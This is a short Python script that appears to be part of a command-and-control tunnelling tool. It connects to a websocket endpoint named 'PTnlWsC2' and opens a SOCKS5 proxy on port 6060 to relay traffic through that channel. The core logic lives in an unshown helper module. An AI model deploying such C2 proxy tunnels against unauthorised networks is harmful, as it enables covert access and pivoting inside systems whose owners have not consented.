import asyncio,sys,websockets
#from socket import inet_ntoa,gethostbyname,inet_ntop,AF_INET6,inet_pton,inet_aton

from packet_utils import PayloadManager,PacketManager,SockV5Handler



if len(sys.argv) != 2:
    print(f'{sys.argv[0]} <uid>')
    exit(0)


 
    
            
    


async def ws_connect():
        
    
    PkgMgr = PacketManager()
    SocksHandler = None
    
    try:
        async with websockets.connect('ws://localhost/PTnlWsC2?uid='+sys.argv[1]) as ws: # websockets.legacy.client.Connect()
            PayloadMgr = PayloadManager()
            SockV5Handler.SetParam(ws,PayloadManager.GetConnList())
            
            SocksHandler = asyncio.create_task(StartSocks5())
            
            print("Connected")
            
            while True:
                # data = await ws.recv()
                
                # if isinstance(data,bytes):
                #     PkgMgr.feed(data)

                
                try:
                    data = await asyncio.wait_for(ws.recv(),3)
                    if isinstance(data,bytes):
                        PkgMgr.feed(data)
                        #print(data)
                except:
                    pass
                
                result = PkgMgr.Parse()
                
                if result is not None:
                    print(result)
                    await PayloadMgr.Parse(**result)



    except Exception as Err:
        print(str(Err))

    finally:
        if SocksHandler is not None:
            SocksHandler.cancel()

async def HandleSocksClient(reader,writer):
    socks5 = SockV5Handler(True,reader,writer)

    try:
        if (await socks5.HandShake(0)) != True:
            raise Exception('SockV5 Handshake Failed')
        

    except Exception as Err:
        print(str(Err))
    finally:
        writer.close()
        await writer.wait_closed()


async def StartSocks5():
    PORT = 6060
    server = await asyncio.start_server(HandleSocksClient,'0.0.0.0',PORT)
    try:
        print(f'Running on port {PORT}')
        async with server:
            await server.serve_forever()
    except asyncio.exceptions.CancelledError:
        server.close()
        await server.wait_closed()

asyncio.run(ws_connect())